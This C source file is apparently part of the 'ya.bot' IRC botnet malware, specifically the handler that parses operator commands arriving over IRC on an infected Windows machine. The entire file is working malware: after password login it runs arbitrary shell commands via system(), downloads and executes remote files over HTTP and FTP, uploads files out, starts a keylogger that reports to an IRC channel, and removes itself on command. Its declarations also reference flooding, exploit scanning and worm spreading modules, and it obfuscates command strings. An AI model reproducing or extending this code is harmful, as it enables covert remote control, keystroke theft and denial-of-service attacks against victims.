/*  ya.bot  */

#include "..\bot.h"

bool irc_parsebuffer(SOCKET bsock, WSAEVENT wsaEvent, char *pszBuffer, int nServer)
{
	int i, nLength;
	if (!pszBuffer)
			return FALSE;
		nLength = strlen(pszBuffer);
	for (i = 0; i < nLength; i++)
		if ((pszBuffer[i] == '\r') || (pszBuffer[i] == '\n'))
				pszBuffer[i] = '\0';
	while (pszBuffer[0])
	{

#ifndef NO_DEBUG
			debug_print("%s", pszBuffer);
#endif

			crypto_xorcommands();
			irc_parseline(bsock, wsaEvent, pszBuffer, nServer);
			crypto_xorcommands();
			nLength = strlen(pszBuffer) + 2;
			pszBuffer += nLength;
	}
		return TRUE;
}

void irc_parseline(SOCKET bsock, WSAEVENT wsaEvent, char *pszBuffer, int nServer)
{
	bool bDelay = FALSE, bTopic = FALSE, bSilent = FALSE, bVerbose = FALSE;
	char *p[POINTER_MAX], szNick[32], szRecvBuffer[IRCBUF], szSendBuffer[IRCBUF];
	int i, s = 3;

#ifndef NO_DCC
	SDCCGet s_dg;
	SDCCSend s_ds;
#endif

#ifndef NO_FILEFIND
	SFileFind s_ff;
#endif

#ifndef NO_FTP
	SFTPDownload s_fd;
	SFTPUpload s_fu;
#endif

#ifndef NO_HTTP
	SHTTPDownload s_hd;
#endif

#ifndef NO_KEYLOG
	SKeylogInfo s_ki;
#endif

#ifndef NO_PSNIFF
	SPacketSniffer s_ps;
#endif

#ifndef NO_DAEMONSOCKS4
	SDaemonSOCKS4 s_ds4;
#endif

#ifndef NO_BANDWITHFLOOD
	SBandwithFlood s_bf;
#endif
#ifndef NO_SYNACKFLOOD
	SSYNACKFlood s_saf;
#endif
#ifndef NO_TROLLFLOOD
	STrollFlood s_tf;
#endif
#ifndef NO_UDPFLOOD
	SUDPFlood s_uf;
#endif

#ifndef NO_BOTKILLER
	SBotKiller s_bk;
#endif

#ifndef NO_EXPSCAN
	SExpScan s_es;
#endif
#ifndef NO_MIRCSCAN
	SMircScan s_ms;
#endif
#ifndef NO_USBSCAN
	SUsbScan s_us;
#endif

#ifndef NO_INSTALLWORMRIDE
	SWormRide s_wr;
#endif

	if (!pszBuffer)
			return;
		strncpy(szRecvBuffer, pszBuffer, sizeof(szRecvBuffer) - 1);
		p[0] = strtok(szRecvBuffer, ": \r\n");
		p[1] = strtok(NULL, " \r\n");
	if ((!p[0]) || (!p[1]))
			return;
		p[2] = strtok(NULL, " \r\n");
		p[s] = strtok(NULL, " \r\n");
	for (i = 4; i < POINTER_MAX; i++)
	{
			p[i] = strtok(NULL, " \r\n");
		if (!p[i])
				break;
		if (cryptedcommuncation)
				crypto_rot47(p[i]);
		if (strcmp(string_ircdelayresponse, p[i]) == 0)
				bDelay = TRUE;
		else if (strcmp(string_ircsilentresponse, p[i]) == 0)
				bSilent = TRUE;
		else if (strcmp(string_ircverboseresponse, p[i]) == 0)
				bVerbose = TRUE;
	}
//-----------------------------------------------------------
//-------------IRC-COMMANDS----------------------------------
//-----------------------------------------------------------
//PING
	if (strcmp(string_ircping, p[0]) == 0)
	{
			irc_action(bsock, (char *)string_ircpong, p[1]);
			return;
	}
//375
	else if (strcmp(string_ircmotd, p[1]) == 0)
	{
			irc_join(bsock,
					(char *)rgSServerList[nServer].m_pszBotChannel,
					(char *)rgSServerList[nServer].m_pszBotChannelKey);
			return;
	}
//422
	else if (strcmp(string_ircnomotd , p[1]) == 0)
	{
			irc_join(bsock,
					(char *)rgSServerList[nServer].m_pszBotChannel,
					(char *)rgSServerList[nServer].m_pszBotChannelKey);
			return;
	}
//433
	else if (strcmp(string_ircnickinuse, p[1]) == 0)
	{
			irc_setnick(bsock, g_szBotNick, sizeof(g_szBotNick));
			irc_userinfo(bsock,
					(char *)rgSServerList[nServer].m_pszServer,
					(char *)rgSServerList[nServer].m_pszServerPassword,
					g_szBotNick);
			irc_join(bsock,
					(char *)rgSServerList[nServer].m_pszBotChannel,
					(char *)rgSServerList[nServer].m_pszBotChannelKey);
			return;
	}
//451
	else if (strcmp(string_ircnotregistered, p[1]) == 0)
	{
			irc_userinfo(bsock,
					(char *)rgSServerList[nServer].m_pszServer,
					(char *)rgSServerList[nServer].m_pszServerPassword,
					g_szBotNick);
			irc_join(bsock,
					(char *)rgSServerList[nServer].m_pszBotChannel,
					(char *)rgSServerList[nServer].m_pszBotChannelKey);
			return;
	}
//474
	else if (strcmp(string_ircbannedfromchannel, p[1]) == 0)
	{
			Sleep(rgSServerList[nServer].m_nHammerTimeOut);
			irc_join(bsock,
					(char *)rgSServerList[nServer].m_pszBotChannel,
					(char *)rgSServerList[nServer].m_pszBotChannelKey);
			return;
	}
//475
	else if (strcmp(string_ircwrongchannelkey, p[1]) == 0)
	{
			Sleep(rgSServerList[nServer].m_nHammerTimeOut);
			irc_join(bsock,
					(char *)rgSServerList[nServer].m_pszBotChannel,
					(char *)rgSServerList[nServer].m_pszBotChannelKey);
			return;
	}
//TOPIC (CHANGE)
	else if (strcmp(string_irctopicset, p[1]) == 0)
			return;
//KICK (USER)
	else if ((strcmp(string_irckick, p[1]) == 0) && (strcmp(p[0], g_szAuthedHost) == 0))
	{
			g_bAuthed = FALSE;
			memset(g_szAuthedHost, 0, sizeof(g_szAuthedHost));
			return;
	}
//PART
	else if ((strcmp(string_ircpart, p[1]) == 0) && (strcmp(p[0], g_szAuthedHost) == 0))
	{
			g_bAuthed = FALSE;
			memset(g_szAuthedHost, 0, sizeof(g_szAuthedHost));
			return;
	}
//QUIT
	else if ((strcmp(string_ircquit, p[1]) == 0) && (strcmp(p[0], g_szAuthedHost) == 0))
	{
			g_bAuthed = FALSE;
			memset(g_szAuthedHost, 0, sizeof(g_szAuthedHost));
			return;
	}
//KICK (BOT)
	else if ((strcmp(string_irckick, p[1]) == 0) && (strcmp(g_szBotNick, p[3]) == 0))
	{
			irc_join(bsock,
					(char *)rgSServerList[nServer].m_pszBotChannel,
					(char *)rgSServerList[nServer].m_pszBotChannelKey);
			return;
	}
//-----------------------------------------------------------
//-------------CLIENT-COMMANDS-------------------------------
//-----------------------------------------------------------
	if ((!p[2]) || (!p[s]))
			return;
	if (p[s][0] == ':')
			p[s] = p[s] + 1;
	if (cryptedcommuncation)
			crypto_rot47(p[s]);
	if (strstr(pszBuffer, "\1"))
	{

#ifndef NO_DCC
//DCC
			_snprintf(szSendBuffer, sizeof(szSendBuffer) - 1,
					string_dccrequest,
					"\1");
		if (strcmp(szSendBuffer, p[s]) == 0)
		{
			if (!g_bAuthed)
					return;
			if (!irc_hostcompare(p[0]))
					return;
			if (strcmp(g_szAuthedHost, p[0]) != 0)
					return;
			if (strcmp(string_dccsend, p[s + 1]) == 0)
			{
				if (!p[s + 2])
						return;
				if (!p[s + 3])
						return;
				if (!p[s + 4])
						return;
				if (!p[s + 5])
						return;
					strncpy(s_dg.m_szFileName, p[s + 2], sizeof(s_dg.m_szFileName) - 1);
					s_dg.m_dwIP = atol(p[s + 3]);
					s_dg.m_nPort = atoi(p[s + 4]);
					s_dg.m_dwFileLength = atoi(p[s + 5]);
					s_dg.m_bsock = bsock;
					strncpy(s_dg.m_szAction, p[1], sizeof(s_dg.m_szAction) - 1);
					strncpy(s_dg.m_szDestination, p[2], sizeof(s_dg.m_szDestination) - 1);
					s_dg.m_bSilent = bSilent;
					s_dg.m_bVerbose = bVerbose;
					thread_add((char *)string_threaddccget, THREAD_DCCGET, dcc_get, &s_dg);
			}
				return;
		}
#endif

//PING
			_snprintf(szSendBuffer, sizeof(szSendBuffer) - 1,
					string_ircclientping,
					"\1");
		if (strcmp(szSendBuffer, p[s]) == 0)
		{
			if (!p[s + 1])
					return;
				p[2] = strtok(p[0], "!");
				irc_message(bsock, (char *)string_ircnotice, p[2],
						(char *)string_ircclientpong,
						"\1",
						p[s + 1]);
				return;
		}
//VERSION
			_snprintf(szSendBuffer, sizeof(szSendBuffer) - 1,
					string_ircclientversion,
					"\1",
					"\1");
		if (strcmp(szSendBuffer, p[s]) == 0)
		{
				p[2] = strtok(p[0], "!");
				irc_message(bsock, (char *)string_ircnotice, p[2],
						(char *)string_ircclientversionresponse,
						"\1",
						versionreply,
						"\1");
				return;
		}
			return;
	}
//-----------------------------------------------------------
//-------------TOPIC-COMMANDS--------------------------------
//-----------------------------------------------------------
#ifndef NO_TOPIC
	else if (strcmp(string_irctopiccommand, p[1]) == 0)
	{
		char szCommands[LOWBUF];
			strncpy(szCommands, p[4], sizeof(szCommands) - 1);
		for (i = 4; i < POINTER_MAX; i++)
		{
			if (!p[i])
					break;
				strncat(szCommands, " ", sizeof(szCommands) - strlen(szCommands) - 1);
				strncat(szCommands, p[i], sizeof(szCommands) - strlen(szCommands) - 1);
		}
		if (strstr(szCommands, string_ircmutlitopicseperator) != NULL)
		{
				strncpy(szRecvBuffer, pszBuffer, sizeof(szRecvBuffer) - 1);
				p[0] = strtok(szRecvBuffer, ": \r\n");
				p[1] = strtok(NULL, " \r\n");
				p[2] = strtok(NULL, " \r\n");
				p[3] = strtok(NULL, ": \r\n");
			for (i = 4; i < POINTER_MAX; i++)
					p[i] = strtok(NULL, "|\r\n");
			for (i = 4; i < POINTER_MAX; i++)
			{
				if (!p[i])
						break;
				if (p[i][0] == ':')
						p[i] = p[i] + 1;
					_snprintf(szSendBuffer, sizeof(szSendBuffer) - 1,
							string_ircmutlitopiccommand,
							p[0],
							g_szBotNick,
							rgSServerList[nServer].m_pszBotChannel,
							p[i],
							"\r\n");
					crypto_xorcommands();
					irc_parsebuffer(bsock, wsaEvent, szSendBuffer, nServer);
					crypto_xorcommands();
			}
				return;
		}
			s = 4;
			p[1] = (char *)string_ircprivmsg;
			p[2] = p[3];
			p[s] = p[s] + 1;
			bTopic = TRUE;
	}
#endif
//-----------------------------------------------------------
//-------------CONTROL-COMMANDS------------------------------
//-----------------------------------------------------------
	if ((!bTopic) && (strcmp(g_szBotNick, p[s]) == 0))
			s = 4;
	if (p[s][0] != commandprefix[0])
			return;
		p[s] = p[s] + 1;
	if (strcmp(g_szBotNick, p[2]) == 0)
	{
			strncpy(szNick, p[0], sizeof(szNick) - 1);
			p[2] = strtok(szNick, "!");
	}
	if (bDelay)
	{
			srand(GetTickCount());
			Sleep((rand() % 120) * 1000);
	}
//-----------------------------------------------------------
//-------------BOT-LOGIN-------------------------------------
//-----------------------------------------------------------
//Login check
	if (!bTopic)
	{
		if (!g_bAuthed)
		{
//Bot Login
			if (strcmp(cmd_botlogin, p[s]) == 0) 
			{
				if (!p[s + 1])
						return;
				if (g_bAuthed)
						return;
				if ((botpassword == crypto_elfhash(p[s + 1])) && (irc_hostcompare(p[0])))
				{
						g_bAuthed = TRUE;
						strncpy(g_szAuthedHost, p[0], sizeof(g_szAuthedHost) - 1);
					if (!bSilent)
							irc_message(bsock, p[1], p[2],
									(char *)string_botloggedin,
									CGREEN, string_replymain, CEND, string_replydotbot);
				}
			}
				return;
		}
		if (!irc_hostcompare(p[0]))
				return;
		if (strcmp(g_szAuthedHost, p[0]) != 0)
				return;
	}
//-----------------------------------------------------------
//-------------BOT-COMMANDS----------------------------------
//-----------------------------------------------------------
//Bot Die
	if (strcmp(cmd_botdie, p[s]) == 0)
	{

#ifndef NO_PERSIST
			TerminateThread(g_hPersistThread, 0);
			CloseHandle(g_hPersistThread);
#endif

			thread_killall();
			irc_action(bsock, (char *)string_ircquit, (char *)string_botquitmsg);
			irc_disconnect(bsock, wsaEvent);
			ExitProcess(0);
	}
//Bot Disconnect
	else if (strcmp(cmd_botdisconnect, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
			g_bAuthed = FALSE;
			memset(g_szAuthedHost, 0, sizeof(g_szAuthedHost));
			irc_action(bsock, (char *)string_ircquit, (char *)string_botquitmsg);

#ifndef NO_DAEMONFTP
			thread_killid(THREAD_DAEMONFTP);
#endif

#ifndef NO_DAEMONHTTP
			thread_killid(THREAD_DAEMONHTTP);
#endif

			thread_killid(THREAD_IRCPING);
			irc_disconnect(bsock, wsaEvent);
			Sleep((atoi(p[s + 1]) * 1000) - rgSServerList[nServer].m_nHammerTimeOut);
			return;
	}
//Bot DNS
	else if (strcmp(cmd_botdns, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
			memset(szSendBuffer, 0, sizeof(szSendBuffer));
		if (dnslookup(p[s + 1], szSendBuffer, sizeof(szSendBuffer) - 1))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_botdnsresolved,
							CGREEN, string_replymain, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1],
							CBLUE, CEND, szSendBuffer);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_botdnsfailed,
							CRED, string_replymain, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1]);
		}
	}
//Bot Info
	else if (strcmp(cmd_botinfo, p[s]) == 0)
	{
		if (!bSilent)
				irc_message(bsock, p[1], p[2],
						(char *)string_botinfo,
						CGREEN, string_replymain, CEND, string_replydotbot,
						CBLUE, CEND, botid,
						CRED, PRODUCT_VERSION, CEND,
						CBLUE, CEND, botfilename,
						CBLUE, CEND, botstartupname);
	}
//Bot Logout
	else if (strcmp(cmd_botlogout, p[s]) == 0)
	{
			g_bAuthed = FALSE;
			memset(g_szAuthedHost, 0, sizeof(g_szAuthedHost));
		if (!bSilent)
				irc_message(bsock, p[1], p[2],
						(char *)string_botloggedout,
						CGREEN, string_replymain, CEND, string_replydotbot);
	}
//Bot Raw
	else if (strcmp(cmd_botraw, p[s]) == 0)
	{
			strncpy(szRecvBuffer, pszBuffer, sizeof(szRecvBuffer) - 1);
			p[0] = strtok(szRecvBuffer, ": \r\n");
			p[1] = strtok(NULL, " \r\n");
			p[2] = strtok(NULL, " \r\n");
			p[3] = strtok(NULL, ": \r\n");
			p[s] = strtok(NULL, "\r\n");
			strncpy(szSendBuffer, p[s], sizeof(szSendBuffer) - 1);
			strncat(szSendBuffer, "\r\n", (sizeof(szSendBuffer) - strlen(szSendBuffer)) - 1);
			send(bsock, szSendBuffer, strlen(szSendBuffer), 0);
	}
//Bot Remove
	else if (strcmp(cmd_botremove, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (botpassword == crypto_elfhash(p[s + 1]))
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_botremovingbot,
							CBLUE, string_replymain, CEND, string_replydotbot);

#ifndef NO_INSTALLBOT
			if (uninstall_bot())
			{

#ifndef NO_PERSIST
					TerminateThread(g_hPersistThread, 0);
					CloseHandle(g_hPersistThread);
#endif

					thread_killall();

#ifndef NO_INSTALLDRIVER
					uninstall_driver();
#endif

#ifndef NO_INSTALLWORMRIDE
					uninstall_wormride();
#endif

					irc_action(bsock, (char *)string_ircquit, (char *)string_botquitmsg);
					irc_disconnect(bsock, wsaEvent);
					uninstall_botmelt();
					ExitProcess(0);
			}
#endif

			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_botremovefailed,
							CRED, string_replymain, CEND, string_replydotbot);
		}
	}
//Bot System
	else if (strcmp(cmd_botsystem, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
			memset(szSendBuffer, 0, sizeof(szSendBuffer));
		for (i = s + 1; i < POINTER_MAX; i++)
		{
			if (!p[i])
					break;
				strncat(szSendBuffer, p[i], (sizeof(szSendBuffer) - strlen(szSendBuffer)) - 1);
			if (p[i + 1])
			{
				if ((strcmp(string_ircdelayresponse, p[i + 1]) == 0) ||
						(strcmp(string_ircsilentresponse, p[i + 1]) == 0) ||
						(strcmp(string_ircverboseresponse, p[i + 1]) == 0)) break;
					strncat(szSendBuffer,
							"\x20",
							(sizeof(szSendBuffer) - strlen(szSendBuffer)) - 1);
			}
		}
			system(szSendBuffer);
		if (!bSilent)
				irc_message(bsock, p[1], p[2],
						(char *)string_botsystemcommand,
						CBLUE, string_replymain, CEND, string_replydotbot,
						CBLUE, CEND, szSendBuffer);
	}
//-----------------------------------------------------------
//-------------DCC-COMMANDS----------------------------------
//-----------------------------------------------------------
#ifndef NO_DCC
//DCC Send
	else if (strcmp(cmd_dccsend, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
			strncpy(s_ds.m_szNick, p[s + 1], sizeof(s_ds.m_szNick) - 1);
			strncpy(s_ds.m_szFilePath, p[s + 2], sizeof(s_ds.m_szFilePath) - 1);
			s_ds.m_bsock = bsock;
			strncpy(s_ds.m_szAction, p[1], sizeof(s_ds.m_szAction) - 1);
			strncpy(s_ds.m_szDestination, p[2], sizeof(s_ds.m_szDestination) - 1);
			s_ds.m_bSilent = bSilent;
			s_ds.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threaddccsend, THREAD_DCCSEND, dcc_send, &s_ds))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_dccalreadyrunning,
							CRED, string_replydcc, CEND, string_replydotbot);
	}
//DCC Stop
	else if (strcmp(cmd_dccstop, p[s]) == 0)
	{
		if ((thread_killid(THREAD_DCCGET)) || (thread_killid(THREAD_DCCSEND)))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_dccstopped,
							CGREEN, string_replydcc, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_dccnotrunning,
							CRED, string_replydcc, CEND, string_replydotbot);
		}
	}
#endif
//-----------------------------------------------------------
//-------------FILE-COMMANDS---------------------------------
//-----------------------------------------------------------
//File Delete
	else if (strcmp(cmd_filedelete, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (file_delete(p[s + 1]))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_filedeleted,
							CGREEN, string_replyfile, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1]);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_fileunabletodelete,
							CRED, string_replyfile, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1]);
		}
	}
#ifndef NO_FILEFIND
//File Find
	else if (strcmp(cmd_filefind, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
			strncpy(s_ff.m_szFileName, p[s + 1], sizeof(s_ff.m_szFileName) - 1);
			strncpy(s_ff.m_szDirectoryName, p[s + 2], sizeof(s_ff.m_szDirectoryName) - 1);
		if (atoi(p[s + 3]))
				s_ff.m_bSubDirectories = TRUE;
		else
				s_ff.m_bSubDirectories = FALSE;
			s_ff.m_bsock = bsock;
			strncpy(s_ff.m_szAction, p[1], sizeof(s_ff.m_szAction) - 1);
			strncpy(s_ff.m_szDestination, p[2], sizeof(s_ff.m_szDestination) - 1);
			s_ff.m_bSilent = bSilent;
			s_ff.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadfilefindmain, THREAD_FILEFIND, file_findmain, &s_ff))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_filealreadysearchingforfile,
							CRED, string_replyfile, CEND, string_replydotbot);
	}
#endif
//File Open
	else if (strcmp(cmd_fileopen, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (file_open(p[s + 1]))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_fileopened,
							CGREEN, string_replyfile, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1]);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_fileunabletoopen,
							CRED, string_replyfile, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1]);
		}
	}
//-----------------------------------------------------------
//-------------FTP-COMMANDS----------------------------------
//-----------------------------------------------------------
#ifndef NO_FTP
//FTP Download
	else if (strcmp(cmd_ftpdownload, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
		if (!p[s + 4])
				return;
		if (!p[s + 5])
				return;
		if (!p[s + 6])
				return;
		if (!p[s + 7])
				return;
			strncpy(s_fd.m_szHost, p[s + 1], sizeof(s_fd.m_szHost) - 1);
			s_fd.m_nPort = atoi(p[s + 2]);
			strncpy(s_fd.m_szUserName, p[s + 3], sizeof(s_fd.m_szUserName) - 1);
			strncpy(s_fd.m_szPassword, p[s + 4], sizeof(s_fd.m_szPassword) - 1);
			strncpy(s_fd.m_szRemoteFilePath, p[s + 5], sizeof(s_fd.m_szRemoteFilePath) - 1);
			strncpy(s_fd.m_szLocalFilePath, p[s + 6], sizeof(s_fd.m_szLocalFilePath) - 1);
		if (atoi(p[s + 7]))
				s_fd.m_bRun = TRUE;
		else
				s_fd.m_bRun = FALSE;
			s_fd.m_bsock = bsock;
			s_fd.m_wsaEvent = NULL;
			strncpy(s_fd.m_szAction, p[1], sizeof(s_fd.m_szAction) - 1);
			strncpy(s_fd.m_szDestination, p[2], sizeof(s_fd.m_szDestination) - 1);
			s_fd.m_bSilent = bSilent;
			s_fd.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadftpdownload, THREAD_FTP, ftp_download, &s_fd))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_ftpalreadytransferringfile,
							CRED, string_replyftp, CEND, string_replydotbot);
	}
//FTP Update
	else if (strcmp(cmd_ftpupdate, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
		if (!p[s + 4])
				return;
		if (!p[s + 5])
				return;
		if (!p[s + 6])
				return;
		if (botpassword == crypto_elfhash(p[s + 6]))
		{
				strncpy(s_fd.m_szHost, p[s + 1], sizeof(s_fd.m_szHost) - 1);
				s_fd.m_nPort = atoi(p[s + 2]);
				strncpy(s_fd.m_szUserName, p[s + 3], sizeof(s_fd.m_szUserName) - 1);
				strncpy(s_fd.m_szPassword, p[s + 4], sizeof(s_fd.m_szPassword) - 1);
				strncpy(s_fd.m_szRemoteFilePath, p[s + 5], sizeof(s_fd.m_szRemoteFilePath) - 1);
				s_fd.m_bsock = bsock;
				s_fd.m_wsaEvent = wsaEvent;
				strncpy(s_fd.m_szAction, p[1], sizeof(s_fd.m_szAction) - 1);
				strncpy(s_fd.m_szDestination, p[2], sizeof(s_fd.m_szDestination) - 1);
				s_fd.m_bSilent = bSilent;
				s_fd.m_bVerbose = bVerbose;
			if (!thread_add((char *)string_threadftpupdate, THREAD_FTP, ftp_update, &s_fd))
				if ((!bSilent) && (bVerbose))
						irc_message(bsock, p[1], p[2],
								(char *)string_ftpalreadytransferringfile,
								CRED, string_replyftp, CEND, string_replydotbot);
		}
	}
//FTP Upload
	else if (strcmp(cmd_ftpupload, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
		if (!p[s + 4])
				return;
		if (!p[s + 5])
				return;
		if (!p[s + 6])
				return;
			strncpy(s_fu.m_szHost, p[s + 1], sizeof(s_fu.m_szHost) - 1);
			s_fu.m_nPort = atoi(p[s + 2]);
			strncpy(s_fu.m_szUserName, p[s + 3], sizeof(s_fu.m_szUserName) - 1);
			strncpy(s_fu.m_szPassword, p[s + 4], sizeof(s_fu.m_szPassword) - 1);
			strncpy(s_fu.m_szLocalFilePath, p[s + 5], sizeof(s_fu.m_szLocalFilePath) - 1);
			strncpy(s_fu.m_szRemoteFilePath, p[s + 6], sizeof(s_fu.m_szRemoteFilePath) - 1);
			s_fu.m_bsock = bsock;
			strncpy(s_fu.m_szAction, p[1], sizeof(s_fu.m_szAction) - 1);
			strncpy(s_fu.m_szDestination, p[2], sizeof(s_fu.m_szDestination) - 1);
			s_fu.m_bSilent = bSilent;
			s_fu.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadftpupload, THREAD_FTP, ftp_upload, &s_fu))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_ftpalreadytransferringfile,
							CRED, string_replyftp, CEND, string_replydotbot);
	}
#endif
//-----------------------------------------------------------
//-------------HTTP-COMMANDS---------------------------------
//-----------------------------------------------------------
#ifndef NO_HTTP
//HTTP Download
	else if (strcmp(cmd_httpdownload, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (!p[s + 3])
				return;
			strncpy(s_hd.m_szUrl, p[s + 1], sizeof(s_hd.m_szUrl) - 1);
			strncpy(s_hd.m_szFilePath, p[s + 2], sizeof(s_hd.m_szFilePath) - 1);
		if (atoi(p[s + 3]))
				s_hd.m_bRun = TRUE;
		else
				s_hd.m_bRun = FALSE;
			s_hd.m_bsock = bsock;
			strncpy(s_hd.m_szAction, p[1], sizeof(s_hd.m_szAction) - 1);
			strncpy(s_hd.m_szDestination, p[2], sizeof(s_hd.m_szDestination) - 1);
			s_hd.m_bSilent = bSilent;
			s_hd.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadhttpdownload, THREAD_HTTP, http_download, &s_hd))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_httpalreadydownloadingfile,
							CRED, string_replyhttp, CEND, string_replydotbot);
	}
//HTTP Update
	else if (strcmp(cmd_httpupdate, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (!p[s + 2])
				return;
		if (botpassword == crypto_elfhash(p[s + 2]))
		{
				strncpy(s_hd.m_szUrl, p[s + 1], sizeof(s_hd.m_szUrl) - 1);
				s_hd.m_szFilePath[0] = '\0';
				s_hd.m_bRun = FALSE;
 				s_hd.m_bsock = bsock;
				s_hd.m_wsaEvent = wsaEvent;
				strncpy(s_hd.m_szAction, p[1], sizeof(s_hd.m_szAction) - 1);
				strncpy(s_hd.m_szDestination, p[2], sizeof(s_hd.m_szDestination) - 1);
				s_hd.m_bSilent = bSilent;
				s_hd.m_bVerbose = bVerbose;
			if (!thread_add((char *)string_threadhttpupdate, THREAD_HTTP, http_update, &s_hd))
				if ((!bSilent) && (bVerbose))
						irc_message(bsock, p[1], p[2],
								(char *)string_httpalreadydownloadingfile,
								CRED, string_replyhttp, CEND, string_replydotbot);
		}
	}
//HTTP Visit
	else if (strcmp(cmd_httpvisit, p[s]) == 0)
	{
		if (!p[s + 1])
				return;
		if (http_visit(p[s + 1]))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_httpvisited,
							CGREEN, string_replyhttp, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1]);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_httpunabletovisit,
							CGREEN, string_replyhttp, CEND, string_replydotbot,
							CBLUE, CEND, p[s + 1]);
		}
	}
#endif
//-----------------------------------------------------------
//-------------INFO-COMMANDS---------------------------------
//-----------------------------------------------------------
#ifndef NO_INFO
//Info Network
	else if (strcmp(cmd_infonet, p[s]) == 0)
	{
			info_getnet(bsock,
					(char *)rgSServerList[nServer].m_pszServer,
					szSendBuffer,
					sizeof(szSendBuffer) - 1);
		if (!bSilent)
				irc_message(bsock, p[1], p[2], szSendBuffer);
	}
//Info System
	else if (strcmp(cmd_infosys, p[s]) == 0)
	{
			info_getsys(szSendBuffer, sizeof(szSendBuffer) - 1);
		if (!bSilent)
				irc_message(bsock, p[1], p[2], szSendBuffer);
	}
#endif
//-----------------------------------------------------------
//-------------KEYLOG-COMMANDS-------------------------------
//-----------------------------------------------------------
#ifndef NO_KEYLOG
//Keylog Sign
	else if (strcmp(cmd_keylogsign, p[s]) == 0)
	{
			g_bSignature = TRUE;
			s_ki.m_bsock = bsock;
			strncpy(s_ki.m_szAction, p[1], sizeof(s_ki.m_szAction) - 1);
			strncpy(s_ki.m_szDestination, p[2], sizeof(s_ki.m_szDestination) - 1);
			strncpy(s_ki.m_szResultChannel,
					rgSServerList[nServer].m_pszKeyLogChannel,
					sizeof(s_ki.m_szResultChannel) - 1);
			s_ki.m_bSilent = bSilent;
			s_ki.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadkeylogmain, THREAD_KEYLOG, &keylog_main, &s_ki))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_keylogalreadyrunning,
							CRED, string_replykeylog, CEND, string_replydotbot);
	}
//Keylog Start
	else if (strcmp(cmd_keylogstart, p[s]) == 0)
	{
			s_ki.m_bsock = bsock;
			strncpy(s_ki.m_szAction, p[1], sizeof(s_ki.m_szAction) - 1);
			strncpy(s_ki.m_szDestination, p[2], sizeof(s_ki.m_szDestination) - 1);
			strncpy(s_ki.m_szResultChannel,
					rgSServerList[nServer].m_pszKeyLogChannel,
					sizeof(s_ki.m_szResultChannel) - 1);
			s_ki.m_bSilent = bSilent;
			s_ki.m_bVerbose = bVerbose;
		if (!thread_add((char *)string_threadkeylogmain, THREAD_KEYLOG, &keylog_main, &s_ki))
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_keylogalreadyrunning,
							CRED, string_replykeylog, CEND, string_replydotbot);
	}
//Keylog Stop
	else if (strcmp(cmd_keylogstop, p[s]) == 0)
	{
			UnhookWindowsHookEx(g_hHook);
			g_hHook = NULL;
			g_hLastFocus = NULL;
			memset(g_szLog, 0, sizeof(g_szLog));
			g_bSignature = FALSE;
		if (thread_killid(THREAD_KEYLOG))
		{
			if (!bSilent)
					irc_message(bsock, p[1], p[2],
							(char *)string_keylogstopped,
							CGREEN, string_replykeylog, CEND, string_replydotbot);
		}
		else
		{
			if ((!bSilent) && (bVerbose))
					irc_message(bsock, p[1], p[2],
							(char *)string_keylognotrunning,
							CRED, string_replykeylog, CEND, string_replydotbot);
		}
	}
#endif
